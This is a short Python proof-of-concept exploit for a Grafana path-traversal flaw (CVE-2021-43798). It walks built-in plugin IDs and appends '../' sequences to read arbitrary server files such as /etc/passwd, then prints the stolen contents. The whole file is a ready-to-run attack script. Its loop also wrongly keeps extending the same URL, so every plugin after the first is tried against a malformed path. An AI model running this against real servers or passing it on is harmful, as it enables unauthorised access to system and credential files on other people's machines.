# -*- coding: utf-8 -*-

import urllib.request
import sys


def send_http(url):
    try:
        req = urllib.request.urlopen(url)
    except:
        print("Connection failed")
        req = None
    if req:
        if req.getcode() != 200:
            print(".", end='')
            req = None
    return req


if __name__ == '__main__':
    if len(sys.argv) == 3:
        url = sys.argv[1]
        file = sys.argv[2]
        pluginIDs = ['cloudwatch', 'dashboard', 'elasticsearch', 'grafana', 'grafana-azure-monitor-datasource',
                     'graphite', 'influxdb', 'jaeger', 'loki', 'mixed', 'mssql', 'mysql', 'opentsdb', 'postgres',
                     'prometheus', 'tempo', 'testdata', 'zipkin', 'alertGroups', 'alertlist', 'annolist', 'barchart',
                     'bargauge', 'canvas', 'dashlist', 'debug', 'gauge', 'geomap', 'gettingstarted', 'graph', 'heatmap',
                     'histogram', 'live', 'logs', 'news', 'nodeGraph', 'piechart', 'pluginlist', 'stat',
                     'state-timeline', 'status-history', 'table', 'table-old', 'text', 'timeseries', 'welcome',
                     'xychart']
        for pluginID in pluginIDs:
            if url[-1] != '/':
                url = url + '/'
            url = url + "public/plugins/" + pluginID + "/../../../../../../../../.." + file
            req = send_http(url)
            if req:
                print("exploit success\n")
                print(req.read().decode())
                print("payload: {0}".format(url))
                break
    else:
        print("usage: CVE-2021-43798-poc.py http://127.0.0.1:3000 /etc/passwd")
